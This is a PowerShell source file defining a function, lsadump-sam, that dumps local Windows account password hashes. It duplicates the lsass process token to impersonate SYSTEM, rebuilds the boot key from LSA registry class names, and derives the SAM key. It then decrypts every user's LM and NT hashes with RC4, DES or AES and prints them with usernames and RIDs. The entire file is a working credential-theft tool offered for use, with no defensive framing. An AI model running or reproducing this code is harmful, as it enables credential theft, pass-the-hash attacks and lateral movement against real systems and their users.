 #Dumping the hashes from the registery
 Function lsadump-sam
 {   
    $dump = @"
    [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
    public static extern int RegOpenKeyEx(int hKey,string subKey,int ulOptions,int samDesired,out int hkResult);

    [DllImport("advapi32.dll", EntryPoint="RegQueryInfoKey", CallingConvention=CallingConvention.Winapi, SetLastError=true)]
    public extern static int RegQueryInfoKey(int hkey,StringBuilder lpClass,ref int lpcbClass,int lpReserved,out int lpcSubKeys,out int lpcbMaxSubKeyLen,out int lpcbMaxClassLen,out int lpcValues,out int lpcbMaxValueNameLen,out int lpcbMaxValueLen,out int lpcbSecurityDescriptor,IntPtr lpftLastWriteTime);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern int RegCloseKey(int hKey);
"@

    $antpassword = [Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0")
    $almpassword = [Text.Encoding]::ASCII.GetBytes("LMPASSWORD`0")
    $empty_lm = [byte[]]@(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee)
    $empty_nt = [byte[]]@(0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0xc0)
    $odd_parity = @(1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
                    16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
                    32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
                    49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
                    64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
                    81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
                    97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
                    112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
                    128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
                    145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
                    161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
                    176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
                    193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
                    208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
                    224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
                    241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
                    )
    
    #Impersonating your current token to the Id of the process your specified(default is System)
    Function token-elevate($id=(Get-Process -Name lsass).Id)
    {
        $elevate = @"
        public enum SECURITY_IMPERSONATION_LEVEL 
        {
            SecurityAnonymous,
            SecurityIdentification,
            SecurityImpersonation,
            SecurityDelegation
        }

        public enum TOKEN_TYPE 
        {
            TokenPrimary = 1,
            TokenImpersonation
        }

        [DllImport("advapi32.dll", CharSet=CharSet.Auto, SetLastError=true)]
        public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes,SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType,out IntPtr phNewToken);

        [DllImport("advapi32.dll", SetLastError=true)] 
        [return: MarshalAs(UnmanagedType.Bool)] 
        public static extern bool SetThreadToken(IntPtr PHThread,IntPtr Token);
    
        [DllImport("advapi32.dll", SetLastError=true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle,UInt32 DesiredAccess, out IntPtr TokenHandle); 
"@

    
        Add-Type -MemberDefinition $elevate -Namespace "token" -Name "elevate"
    
        $TOKEN_IMPERSONATE = 4
        $TOKEN_DUPLICATE = 2
        $TOKEN_QUERY = 8

        #Open handle to the token of the process, duplicate it and set the current thread token to the one of the process.
        Function TokenImpersonate($id)
        {
            $process = Get-Process -Id $id
            $hToken = New-Object System.IntPtr
            [token.elevate]::OpenProcessToken($process.Handle,$TOKEN_IMPERSONATE -bor $TOKEN_DUPLICATE,[ref]$hToken)|Out-Null

            $DupToken = New-Object System.IntPtr
            [token.elevate]::DuplicateTokenEx($hToken,$TOKEN_QUERY -bor $TOKEN_IMPERSONATE,[intptr]::Zero,[token.elevate+SECURITY_IMPERSONATION_LEVEL]::SecurityImpersonation,[token.elevate+TOKEN_TYPE]::TokenImpersonation,[ref]$DupToken)|Out-Null
            [token.elevate]::SetThreadToken([IntPtr]::Zero,$DupToken)|Out-Null
        }

        $prid = (Get-Process -Name lsass).Id
        if($id -eq $prid){TokenImpersonate $prid}
        else{TokenImpersonate $prid ; TokenImpersonate $id}
    }

    #return the des keys for the decryption of the hash
    function str_to_key($s)
    {
        $k0 = [int][math]::Floor($s[0] * 0.5)
        $k1 = ( $($s[0] -band 0x01) * 64) -bor [int][math]::Floor($s[1] * 0.25)
        $k2 = ( $($s[1] -band 0x03) * 32) -bor [int][math]::Floor($s[2] * 0.125)
        $k3 = ( $($s[2] -band 0x07) * 16) -bor [int][math]::Floor($s[3] * 0.0625)
        $k4 = ( $($s[3] -band 0x0F) * 8) -bor [int][math]::Floor($s[4] * 0.03125)
        $k5 = ( $($s[4] -band 0x1F) * 4) -bor [int][math]::Floor($s[5] * 0.015625)
        $k6 = ( $($s[5] -band 0x3F) * 2) -bor [int][math]::Floor($s[6] * 0.0078125)
        $k7 = $($s[6] -band 0x7F)

        $key = @($k0, $k1, $k2, $k3, $k4, $k5, $k6, $k7)

        0..7 | %{
            $key[$_] = $odd_parity[($key[$_] * 2)]
        }

        return ,$key
    }

    #using str_to_key to retrieve the des keys from the RID of the user
    function sid_to_key($sid)
    {
        $c0 = $sid -band 255
        $c1 = ($sid -band 65280)/256
        $c2 = ($sid -band 16711680)/65536
        $c3 = ($sid -band 4278190080)/16777216

        $s1 = @($c0, $c1, $c2, $c3, $c0, $c1, $c2)
        $s2 = @($c3, $c0, $c1, $c2, $c3, $c0, $c1) 

        return ,((str_to_key $s1),(str_to_key $s2))
    }

    #Create RC4 key to encrypt and decrypt
    function NewRC4([byte[]]$key)
    {
        return new-object Object |
        Add-Member NoteProperty key $key -PassThru |
        Add-Member NoteProperty S $null -PassThru |
        Add-Member ScriptMethod init {
            if (-not $this.S)
            {
                [byte[]]$this.S = 0..255;
                0..255 | % -begin{[long]$j=0;}{
                    $j = ($j + $this.key[$($_ % $this.key.Length)] + $this.S[$_]) % $this.S.Length;
                    $temp = $this.S[$_]; $this.S[$_] = $this.S[$j]; $this.S[$j] = $temp;
                    }
            }
        } -PassThru |
        Add-Member ScriptMethod "encrypt" {
            $data = $args[0];
            $this.init();
            $outbuf = new-object byte[] $($data.Length);
            $S2 = $this.S[0..$this.S.Length];
            0..$($data.Length-1) | % -begin{$i=0;$j=0;} {
                $i = ($i+1) % $S2.Length;
                $j = ($j + $S2[$i]) % $S2.Length;
                $temp = $S2[$i];$S2[$i] = $S2[$j];$S2[$j] = $temp;
                $a = $data[$_];
                $b = $S2[ $($S2[$i]+$S2[$j]) % $S2.Length ];
                $outbuf[$_] = ($a -bxor $b);
            }
            return ,$outbuf;
        } -PassThru
    }

    #create DES key 
    function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt)
    {
        $des = new-object Security.Cryptography.DESCryptoServiceProvider;
        $des.Mode = [Security.Cryptography.CipherMode]::ECB;
        $des.Padding = [Security.Cryptography.PaddingMode]::None;
        $des.Key = $key;
        $des.IV = $key;
        $transform = $null;
        if ($doEncrypt) {$transform = $des.CreateEncryptor();}
        else{$transform = $des.CreateDecryptor();}
        $result = $transform.TransformFinalBlock($data, 0, $data.Length);
        return ,$result;
    }

    #decrypt DES
    function des_decrypt([byte[]]$data, [byte[]]$key)
    {
        return ,(des_transform $data $key $false)
    }

    #encrypt DES
    function des_encrypt([byte[]]$data, [byte[]]$key)
    {
        return ,(des_transform $data $key $true)
    }

    #Create AES key and decrypt data(used for newer versions)
    function DecryptAES([byte[]]$data, [byte[]]$key, $iv=[System.Array]::CreateInstance([byte],16))
    {
        $AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC;
        $AES.Padding = [System.Security.Cryptography.PaddingMode]::Zeros; #Check maybe None
        $AES.BlockSize = 128
        $AES.KeySize = 128
        $AES.IV = $iv
        $AES.Key = $key

        $decryptor = $AES.CreateDecryptor()
        $unencryptedData = $decryptor.TransformFinalBlock($data,0,$data.Length)
        return $unencryptedData
    }

 
             
    #Return info about key in registry
    function Get-RegKeyClass([string]$key, [string]$subkey)
    {
        switch ($Key) {
            "HKCR" { $nKey = 0x80000000} #HK Classes Root
            "HKCU" { $nKey = 0x80000001} #HK Current User
            "HKLM" { $nKey = 0x80000002} #HK Local Machine
            "HKU"  { $nKey = 0x80000003} #HK Users
            "HKCC" { $nKey = 0x80000005} #HK Current Config
            default { throw "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC"}
        }
        $KEYQUERYVALUE = 0x1;
        $KEYREAD = 0x19;
        $KEYALLACCESS = 0x3F;
        $result = "";
        [int]$hkey=0
        if (-not [lsadump.sam]::RegOpenKeyEx($nkey,$subkey,0,$KEYREAD,[ref]$hkey))
        {
            $classVal = New-Object Text.Stringbuilder 1024
            [int]$len = 1024
            if (-not [lsadump.sam]::RegQueryInfoKey($hkey,$classVal,[ref]$len,0,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,0))
            {
                $result = $classVal.ToString()
            }
            else{Write-Error "RegQueryInfoKey failed"}   
            [lsadump.sam]::RegCloseKey($hkey) | Out-Null
        }
        else{Write-Error "Cannot open key"}
        return $result
    }

    #Retrieve the boot key
    function Get-BootKey
    {
        $s = [string]::Join("",$("JD","Skew1","GBG","Data" | %{Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_"}))
        $b = new-object byte[] $($s.Length/2)
        0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)}
        $b2 = new-object byte[] 16
        0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | % -begin{$i=0;}{$b2[$i]=$b[$_];$i++}
        return ,$b2;
    }

    #calculate using the bootkey, the hashed boot key
    function Get-HBootKey
    {
        param([byte[]]$bootkey)
        $aqwerty = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0")
        $anum = [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0")
        $k = Get-Item HKLM:\SAM\SAM\Domains\Account
        if (-not $k) {return $null}
        [byte[]]$F = $k.GetValue("F")
        if (-not $F) {return $null}
        if($F[0] -eq 2)
        {
            $rc4key = [Security.Cryptography.MD5]::Create().ComputeHash($F[0x70..0x7F] + $aqwerty + $bootkey + $anum)
            $rc4 = NewRC4 $rc4key;
            return ,($rc4.encrypt($F[0x80..0x9F]))
        }

        elseif($F[0] -eq 3)
        {
            return ,(DecryptAES $F[136..151] $bootkey $F[120..135])
        }
    }

    #Retrieve the username who own the hash
    function Get-UserName([byte[]]$V)
    {
        if (-not $V) {return $null};
        $offset = [BitConverter]::ToInt32($V[0x0c..0x0f],0) + 0xCC;
        $len = [BitConverter]::ToInt32($V[0x10..0x13],0);
        return [Text.Encoding]::Unicode.GetString($V, $offset, $len);
    }

    #Retreieve the user hashes
    function Get-UserHashes($u, [byte[]]$hbootkey)
    {
        [byte[]]$enc_lm_hash = $null 
        [byte[]]$enc_nt_hash = $null       

        $global:lmHashLength = [System.BitConverter]::ToInt32($u.V[0xa0..0xa3],0)
        $ntHashLength = [System.BitConverter]::ToInt32($u.V[0xac..0xaf],0)

        if($u.v[[System.BitConverter]::ToInt32($u.V[0xa8..0xab],0) +0xcc +2] -eq 1)
        {
            if ($lmHashLength -eq 20)
            {
                $lm_hash_offset = [System.BitConverter]::ToInt32($u.V[0x9c..0x9f],0) + 0xcc + 4
                $enc_lm_hash = $u.V[$($lm_hash_offset)..$($lm_hash_offset+0x0f)]
            }

            if ($ntHashLength -eq 20)
            {
                $nt_hash_offset = [System.BitConverter]::ToInt32($u.V[0xa8..0xab],0) + 0xcc + 4
                $enc_nt_hash = [byte[]]$u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)]
            }
            return ,(DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey $false)
        }
            
        else
        {
            if($lmHashLength -eq 24)
            {
                $lm_hash_offset = [System.BitConverter]::ToInt32($u.V[0x9c..0x9f],0) + 0xcc + 4
                $enc_lm_hash = $u.V[$($lm_hash_offset)..$($lm_hash_offset+$lmHashLength -1)]
            }

            $nt_hash_offset = [System.BitConverter]::ToInt32($u.V[0xa8..0xab],0) + 0xcc + 4
            $enc_nt_hash = [byte[]]$u.V[$($nt_hash_offset)..$($nt_hash_offset+$ntHashLength -1)]

            return ,(DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey $true)
        }
        
    }

    #Decrypt the Hashes of the user
    function DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey,[bool]$AES)
    {
        [byte[]]$lmhash = $empty_lm 
        [byte[]]$nthash=  $empty_nt
        # LM Hash
        if ($lmHashLength -ge 20){$lmhash = DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword $AES}
    
        # NT Hash
        if ($enc_nt_hash){$nthash = DecryptSingleHash $rid $hbootkey $enc_nt_hash $antpassword $AES}
        return ,($lmhash,$nthash)
    }

    #Decrypt Single Hash
    function DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr,[bool]$AES)
    {
        $deskeys = sid_to_key $rid
        if(!($AES))
        {
            $md5 = [Security.Cryptography.MD5]::Create()
            $rc4_key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr)
            $rc4 = NewRC4 $rc4_key
            $obfkey = $rc4.encrypt($enc_hash)
        }

        else
        {
            if($enc_hash.Count -gt 24){$obfkey = (DecryptAES $enc_hash[20..51] $hbootkey $enc_hash[4..19])[0..0x0f]}
            else{$obfkey = $null}
        }
        
        if($obfkey -eq $null)
        {
            if([System.Text.Encoding]::ASCII.GetString($lmntstr) -eq [System.Text.Encoding]::ASCII.GetString($almpassword)){$hash = [byte[]]$empty_lm}
            elseif([System.Text.Encoding]::ASCII.GetString($lmntstr) -eq [System.Text.Encoding]::ASCII.GetString($antpassword)){$hash = [byte[]]$empty_nt}
        }
        else
        {
            $hash = (des_decrypt  $obfkey[0..7] $deskeys[0]) + (des_decrypt $obfkey[8..$($obfkey.Length - 1)] $deskeys[1])
        }

        return ,$hash
    }

    #Get all the userkeys from the registry
    function Get-UserKeys
    {
        ls HKLM:\SAM\SAM\Domains\Account\Users | 
        where {$_.PSChildName -match "^[0-9A-Fa-f]{8}$"} | 
        Add-Member AliasProperty KeyName PSChildName -PassThru |
        Add-Member ScriptProperty Rid {[Convert]::ToInt32($this.PSChildName, 16)} -PassThru |
        Add-Member ScriptProperty V {[byte[]]($this.GetValue("V"))} -PassThru |
        Add-Member ScriptProperty UserName {Get-UserName($this.GetValue("V"))} -PassThru 
    }

    #Main Function Start Here!!
    Add-Type -MemberDefinition $dump -Namespace "lsadump" -Name "sam" -UsingNamespace System.Text

    token-elevate|Out-Null
    $bootkey = Get-BootKey
    $hbootKey = Get-HBootKey $bootkey
    $UserKeys = Get-UserKeys
    Write-Host "`nDomain: "$env:COMPUTERNAME -ForegroundColor Cyan
    Write-Host "`nSysKey: "$([System.BitConverter]::ToString($bootkey).Replace("-","").ToLower()) -ForegroundColor Cyan
    Write-Host "`nSamKey: " $([System.BitConverter]::ToString($hbootKey).Replace("-","").ToLower()) -ForegroundColor Cyan
    foreach($user in $UserKeys)
    {
        $UserHash = New-Object psobject
        $Nt_and_Lm_Hash = Get-UserHashes $User -hbootkey $hbootKey
        Add-Member -InputObject $UserHash -MemberType NoteProperty -Name "UserName" -Value $user.UserName
        Add-Member -InputObject $UserHash -MemberType NoteProperty -Name "Rid" -Value $user.Rid
        $lm_hash = [System.BitConverter]::ToString($Nt_and_Lm_Hash[0]).Replace("-","").ToLower()
        $nt_hash = [System.BitConverter]::ToString($Nt_and_Lm_Hash[1]).Replace("-","").ToLower()
        if($lm_hash -ne [System.BitConverter]::ToString($empty_lm).Replace("-","").ToLower()){Add-Member -InputObject $UserHash -MemberType NoteProperty -Name "LmHash" -Value $lm_hash}
        else{Add-Member -InputObject $UserHash -MemberType NoteProperty -Name "LmHash" -Value ""}
        if($nt_hash -ne [System.BitConverter]::ToString($empty_nt).Replace("-","").ToLower()){Add-Member -InputObject $UserHash -MemberType NoteProperty -Name "NtHash" -Value $nt_hash}
        else{Add-Member -InputObject $UserHash -MemberType NoteProperty -Name "NtHash" -Value ""}
        $to_print = "`nUserName: " + $UserHash.UserName + "`nRid: " + $UserHash.Rid + "`nLmHash: " + $UserHash.LmHash + "`nNtHash: " + $UserHash.NtHash
        Write-Host $to_print
    }

    [token.elevate]::SetThreadToken([System.IntPtr]::Zero,[System.IntPtr]::Zero)|Out-Null
}